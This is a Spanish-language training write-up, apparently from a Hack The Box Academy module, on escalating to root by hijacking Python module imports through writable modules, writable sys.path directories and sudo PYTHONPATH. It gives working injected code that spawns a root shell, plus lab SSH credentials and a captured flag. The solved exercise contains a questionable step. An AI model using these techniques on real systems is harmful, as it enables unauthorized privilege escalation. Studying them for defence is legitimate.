
# Secuestro de librería de Python

Python es uno de los lenguajes de programación más populares y utilizados del mundo y ya ha sustituido a muchos otros lenguajes de programación en la industria de TI. Hay muchas razones por las que Python es tan popular entre los programadores. Una de ellas es que los usuarios pueden trabajar con una amplia colección de bibliotecas.

En Python se utilizan muchas bibliotecas que se emplean en muchos campos diferentes. Una de ellas es [NumPy](https://numpy.org/doc/stable/) , una extensión de código abierto para Python. `NumPy` proporciona funciones precompiladas para el análisis numérico. En particular, permite un manejo sencillo de listas y matrices extensas. Sin embargo, ofrece muchas otras funciones esenciales, como funciones de generación de números aleatorios, transformada de Fourier, álgebra lineal y muchas otras. Además, NumPy proporciona muchas funciones matemáticas para trabajar con matrices y arreglos.

Otra biblioteca es [Pandas](https://pandas.pydata.org/docs/) , `Pandas` una biblioteca para el procesamiento y análisis de datos con Python. Amplía Python con estructuras de datos y funciones para procesar tablas de datos. Una de las fortalezas de Pandas es el análisis de series temporales.&#x20;

Python cuenta con [la biblioteca estándar de Python](https://docs.python.org/3/library/) , con muchos módulos incorporados desde una instalación estándar de Python. Estos módulos ofrecen muchas soluciones que de otro modo tendrían que elaborarse laboriosamente escribiendo nuestros programas. Aquí se ahorran incontables horas de trabajo si se tiene una visión general de los módulos disponibles y sus posibilidades. El sistema modular está integrado en esta forma por razones de rendimiento. Si se tuvieran todas las posibilidades disponibles de inmediato en la instalación básica de Python sin importar el módulo correspondiente, la velocidad de todos los programas Python se vería muy afectada.

#### **Importación de módulos**

En Python, podemos importar módulos con bastante facilidad:

```python
#!/usr/bin/env python3

# Metodo 1
import pandas

# Metodo 2
from pandas import *

# Metodo 3
from pandas import Series
```

Hay muchas formas de piratear una biblioteca de Python. Mucho depende del script y de su contenido. Sin embargo, hay tres vulnerabilidades básicas en las que se puede piratear:

1. Permisos de escritura incorrectos
2. Ruta de la biblioteca
3. Variable de entorno PYTHONPATH

***

## <mark style="color:purple;">Permisos de escritura incorrectos</mark>

Por ejemplo, podemos imaginar que estamos en el host de un desarrollador en la intranet de la empresa y que el desarrollador está trabajando con Python. Por lo tanto, tenemos un total de tres componentes que están conectados. Este es el script de Python real que importa un módulo de Python y los privilegios del script, así como los permisos del módulo.

Es posible que uno u otro módulo de Python tenga permisos de escritura establecidos para todos los usuarios por error. Esto permite editar y manipular el módulo de Python para que podamos insertar comandos o funciones que produzcan los resultados que deseamos. Si se han asignado permisos `SUID`/ `SGID` al script de Python que importa este módulo, nuestro código se incluirá automáticamente.

Si observamos los permisos establecidos del script `mem_status.py`, podemos ver que tiene un conjunto `SUID`.

```shell-session
htb-student@lpenix:~$ ls -l mem_status.py

-rwsrwxr-x 1 root mrb3n 188 Dec 13 20:13 mem_status.py
```

De esta forma podemos ejecutar este script con los privilegios de otro usuario, en nuestro caso como `root`. También tenemos permiso para ver el script y leer su contenido.

```python
#!/usr/bin/env python3
import psutil

available_memory = psutil.virtual_memory().available * 100 / psutil.virtual_memory().total

print(f"Available memory: {round(available_memory, 2)}%")
```

Este script es bastante simple y solo muestra la memoria virtual disponible en porcentaje. También podemos ver en la segunda línea que este script importa el módulo `psutil` y utiliza la función `virtual_memory()`.

Entonces podemos buscar esta función en la carpeta de `psutil` y verificar si este módulo tiene permisos de escritura para nosotros.

**Permisos del módulo**

```shell-session
htb-student@lpenix:~$ grep -r "def virtual_memory" /usr/local/lib/python3.8/dist-packages/psutil/*

/usr/local/lib/python3.8/dist-packages/psutil/__init__.py:def virtual_memory():
/usr/local/lib/python3.8/dist-packages/psutil/_psaix.py:def virtual_memory():
/usr/local/lib/python3.8/dist-packages/psutil/_psbsd.py:def virtual_memory():
/usr/local/lib/python3.8/dist-packages/psutil/_pslinux.py:def virtual_memory():
/usr/local/lib/python3.8/dist-packages/psutil/_psosx.py:def virtual_memory():
/usr/local/lib/python3.8/dist-packages/psutil/_pssunos.py:def virtual_memory():
/usr/local/lib/python3.8/dist-packages/psutil/_pswindows.py:def virtual_memory():


htb-student@lpenix:~$ ls -l /usr/local/lib/python3.8/dist-packages/psutil/__init__.py

-rw-r--rw- 1 root staff 87339 Dec 13 20:07 /usr/local/lib/python3.8/dist-packages/psutil/__init__.py
```

Estos permisos son más comunes en entornos de desarrollo donde muchos desarrolladores trabajan en diferentes scripts y pueden requerir privilegios más altos.

**Contenido del módulo**

```python
...SNIP...

def virtual_memory():

	...SNIP...
	
    global _TOTAL_PHYMEM
    ret = _psplatform.virtual_memory()
    # cached for later use in Process.memory_percent()
    _TOTAL_PHYMEM = ret.total
    return ret

...SNIP...
```

Esta es la parte de la librería donde podemos insertar nuestro código. Se recomienda ponerlo justo al principio de la función. Allí podemos insertar todo lo que consideremos correcto y efectivo. Podemos importar el módulo `os` para realizar pruebas, lo que nos permite ejecutar comandos del sistema. Con esto podemos insertar el comando `id` y comprobar durante la ejecución del script si se ejecuta el código insertado.

**Contenido del módulo - Secuestro**

```python
...SNIP...

def virtual_memory():

	...SNIP...
	#### Hijacking
	import os
	os.system('id')

    global _TOTAL_PHYMEM
    ret = _psplatform.virtual_memory()
    # cached for later use in Process.memory_percent()
    _TOTAL_PHYMEM = ret.total
    return ret

...SNIP...
```

Ahora podemos ejecutar el script como `sudo` y comprobar si obtenemos el resultado deseado.

#### **Escalada de privilegios**

```shell-session
htb-student@lpenix:~$ sudo /usr/bin/python3 ./mem_status.py

uid=0(root) gid=0(root) groups=0(root)
uid=0(root) gid=0(root) groups=0(root)
Available memory: 79.22%
```

Éxito. Como podemos ver en el resultado anterior, pudimos secuestrar la biblioteca y ejecutar nuestro código dentro de la función `virtual_memory()` como `root`. Ahora que tenemos el resultado deseado, podemos editar la biblioteca nuevamente, pero esta vez, insertando un reverse shell que se conecta a nuestro host como `root`.

***

## <mark style="color:purple;">Ruta de la biblioteca</mark>

En Python, cada versión tiene un orden específico en el que se buscan y se importan las bibliotecas (`modulos`). El orden en el que Python importa los `modulos` se basa en un sistema de prioridades, lo que significa que las rutas que se encuentran más arriba en la lista tienen prioridad sobre las que se encuentran más abajo. Podemos ver esto emitiendo el siguiente comando:

#### **Listado de PYTHONPATH**

```shell-session
htb-student@lpenix:~$ python3 -c 'import sys; print("\n".join(sys.path))'

/usr/lib/python38.zip
/usr/lib/python3.8
/usr/lib/python3.8/lib-dynload
/usr/local/lib/python3.8/dist-packages
/usr/lib/python3/dist-packages
```

Para poder utilizar esta variante son necesarios dos requisitos previos.

1. El módulo que importa el script se encuentra bajo una de las rutas de menor prioridad enumeradas a través de la variable `PYTHONPATH`.
2. Debemos tener permisos de escritura en una de las rutas que tenga mayor prioridad en la lista.

Por lo tanto, si el módulo importado se encuentra en una ruta más abajo en la lista y nuestro usuario puede editar una ruta de mayor prioridad, podemos crear un módulo nosotros mismos con el mismo nombre e incluir nuestras propias funciones deseadas. Dado que la ruta de mayor prioridad se lee antes y se examina en busca del módulo en cuestión, Python accede al primer resultado que encuentra y lo importa antes de llegar al módulo original y deseado.

Para que esto tenga un poco más de sentido, continuemos con el ejemplo anterior y mostremos cómo se puede aprovechar. Anteriormente, el módulo `psutil` se importó al script `mem_status.py`. Podemos ver la ubicación de instalación predeterminada de `psutil` emitiendo el siguiente comando:

#### **Ubicación de instalación predeterminada de Psutil**

```shell-session
htb-student@lpenix:~$ pip3 show psutil

...SNIP...
Location: /usr/local/lib/python3.8/dist-packages

...SNIP...
```

En este ejemplo, podemos ver que `psutil` está instalado en la siguiente ruta: `/usr/local/lib/python3.8/dist-packages`. De nuestra lista anterior de la variable `PYTHONPATH`, tenemos una cantidad razonable de directorios para elegir y ver si puede haber alguna configuración incorrecta en el entorno que nos permita `acceso de escritura` a alguno de ellos. Vamos a comprobarlo.

#### **Permisos de directorio mal configurados**

```shell-session
htb-student@lpenix:~$ ls -la /usr/lib/python3.8

total 4916
drwxr-xrwx 30 root root  20480 Dec 14 16:26 .
...SNIP...
```

Después de comprobar todos los directorios enumerados, parece que la ruta `/usr/lib/python3.8` está mal configurada de forma que permite que cualquier usuario escriba en ella. Al compararla con los valores de la variable `PYTHONPATH`, podemos ver que esta ruta está más arriba en la lista que la ruta en la que `psutil` está instalado. Intentemos abusar de esta configuración incorrecta para crear nuestro propio módulo que contenga nuestra propia función `psutil` maliciosa dentro del directorio `virtual_memory()/usr/lib/python3.8`

#### **Contenido del módulo secuestrado - psutil.py**

```python
#!/usr/bin/env python3

import os

def virtual_memory():
    os.system('id')
```

Para llegar a este punto, necesitamos crear un archivo llamado `psutil.py` que contenga los contenidos enumerados anteriormente en el directorio mencionado anteriormente. Es muy importante que nos aseguremos de que el módulo que creamos tenga el mismo nombre que la importación, así como la misma función con la cantidad correcta de argumentos que se le pasan como la función que pretendemos secuestrar. Esto es fundamental, ya que sin que se cumpla alguna de estas condiciones `true`, no podremos realizar este ataque. Después de crear este archivo que contiene el ejemplo de nuestro script de secuestro anterior, hemos preparado con éxito el sistema para la explotación.

Ejecutemos nuevamente el script `mem_status.py` con `sudo`como en el ejemplo anterior.

#### **Escalada de privilegios mediante el secuestro de la ruta de la biblioteca de Python**

```shell-session
htb-student@lpenix:~$ sudo /usr/bin/python3 mem_status.py

uid=0(root) gid=0(root) groups=0(root)
Traceback (most recent call last):
  File "mem_status.py", line 4, in <module>
    available_memory = psutil.virtual_memory().available * 100 / psutil.virtual_memory().total
AttributeError: 'NoneType' object has no attribute 'available' 
```

Como podemos ver en el resultado, hemos obtenido la ejecución como `root` con éxito secuestrando la ruta del módulo mediante una configuración incorrecta en los permisos del directorio `/usr/lib/python3.8`

***

## <mark style="color:purple;">Variable de entorno PYTHONPATH</mark>

En la sección anterior, abordamos el término `PYTHONPATH`, sin embargo, no explicamos completamente su uso e importancia con respecto a la funcionalidad de Python. `PYTHONPATH` es una variable de entorno que indica en qué directorio (o directorios) Python puede buscar módulos para importar. Esto es importante ya que si a un usuario se le permite manipular y configurar esta variable mientras ejecuta el binario de Python, puede redirigir efectivamente la funcionalidad de búsqueda de Python a una ubicación `definida por el usuario` cuando llegue el momento de importar módulos. Podemos ver si tenemos los permisos para configurar variables de entorno para el binario de Python al verificar nuestros permisos `sudo`:

#### **Comprobando los permisos de sudo**

```shell-session
htb-student@lpenix:~$ sudo -l 

Matching Defaults entries for htb-student on ACADEMY-LPENIX:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User htb-student may run the following commands on ACADEMY-LPENIX:
    (ALL : ALL) SETENV: NOPASSWD: /usr/bin/python3
```

Como podemos ver en el ejemplo, se nos permite ejecutar `/usr/bin/python3` bajo los permisos de confianza de `sudo` y, por lo tanto, se nos permite configurar variables de entorno para usar con este binario mediante la flag `SETENV:`. Es importante tener en cuenta que, debido a la naturaleza confiable de `sudo`, cualquier variable de entorno definida antes de llamar al binario no está sujeta a ninguna restricción con respecto a poder configurar variables de entorno en el sistema. Esto significa que, al usar el binario `/usr/bin/python3`, podemos configurar de manera efectiva cualquier variable de entorno en el contexto de nuestro programa en ejecución. Intentemos hacerlo ahora usando el script `psutil.py` de la sección anterior.

#### **Escalada de privilegios mediante la variable de entorno PYTHONPATH**

```shell-session
htb-student@lpenix:~$ sudo PYTHONPATH=/tmp/ /usr/bin/python3 ./mem_status.py

uid=0(root) gid=0(root) groups=0(root)
...SNIP...
```

En este ejemplo, hemos movido el script de Python anterior del directorio `/usr/lib/python3.8` a `/tmp`. Desde aquí, volvemos a llamar a `/usr/bin/python3` para correr `mem_stats.py`, sin embargo, especificamos que la variable `PYTHONPATH` contiene el directorio `/tmp` para que fuerce a Python a buscar en ese directorio el módulo `psutil` que se va a importar. Como podemos ver, una vez más hemos ejecutado con éxito nuestro script en el contexto de root.

***

## <mark style="color:purple;">Caso práctico</mark>

```
SSH a 10.129.205.114 (ACADEMY-LLPE-PYHIJACK)
Usuario "htb-student"
Contraseña "HTB_@cademy_stdnt!"
```

Siga los ejemplos de esta sección para escalar privilegios. Intente practicar el secuestro de bibliotecas de Python a través de los distintos métodos que se describen. Envíe el contenido de flag.txt con el usuario root como respuesta.

Al acceder por SSH nos encontramos un ejecutable `mem_status.py` en python que podemos ejecutar como root:

```shell-session
htb-student@ubuntu:~$ ls -la
total 36
drwxr-xr-x 3 htb-student htb-student 4096 Jun 14  2023 .
drwxr-xr-x 4 root        root        4096 Jun  5  2023 ..
lrwxrwxrwx 1 root        root           9 Jun 14  2023 .bash_history -> /dev/null
-rw-r--r-- 1 htb-student htb-student  220 May 19  2023 .bash_logout
-rw-r--r-- 1 htb-student htb-student 3771 May 19  2023 .bashrc
drwx------ 2 htb-student htb-student 4096 Jun  5  2023 .cache
-rwSrwxr-x 1 root        root         192 May 19  2023 mem_status.py
-rw-r--r-- 1 htb-student htb-student  807 May 19  2023 .profile
-rw------- 1 htb-student htb-student 8073 Jun  8  2023 .viminfo
```

Al comprobar los permisos de ejecución encontramos que este usuario puede ejecutar este script libremente:

```shell-session
htb-student@ubuntu:~$ sudo -l
Matching Defaults entries for htb-student on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User htb-student may run the following commands on ubuntu:
    (ALL) NOPASSWD: /usr/bin/python3 /home/htb-student/mem_status.py
```

Al leer el archivo vemos que tiene importado el módulo psutil, así que vamos a secuestrarlo:

```python
#!/usr/bin/env python3
import psutil 

available_memory = psutil.virtual_memory().available * 100 / psutil.virtual_memory().total

print(f"Available memory: {round(available_memory, 2)}%")
```

### **Hijacking del módulo `psutil`**

Si puedes controlar el entorno donde se ejecuta este script, puedes engañar a Python para que cargue un módulo malicioso en lugar del módulo legítimo `psutil`.

### **Paso 1: Crea un archivo `psutil.py` malicioso**

En el directorio actual, crea un archivo llamado `psutil.py` con el siguiente contenido:

```python
import os

# Código malicioso: abre una shell con privilegios root
os.system("/bin/bash")
```

```shell-session
htb-student@ubuntu:~$ ls
mem_status.py  psutil.py
```

***

### **Paso 2: Asegúrate de que Python priorice tu archivo**

Python busca módulos en las rutas especificadas en `PYTHONPATH` o en el directorio actual antes de cargar los módulos del sistema. Para aprovechar esto, configura el entorno:

```bash
htb-student@ubuntu:~$ export PYTHONPATH=.
htb-student@ubuntu:~$ sudo /usr/bin/python3 /home/htb-student/mem_status.py
```

***

### Verificación

Después de ejecutar, deberías ver que obtienes una shell con permisos elevados:

```bash
root@ubuntu:/home/htb-student# id
uid=0(root) gid=0(root) groups=0(root)

root@ubuntu:/home/htb-student# whoami
root
```

```shell-session
root@ubuntu:/home/htb-student# cd /root

root@ubuntu:~# ls
flag.txt  snap

root@ubuntu:~# cat flag.txt 
HTB{3xpl0i7iNG_Py7h0n_lI8R4ry_HIjiNX}
```
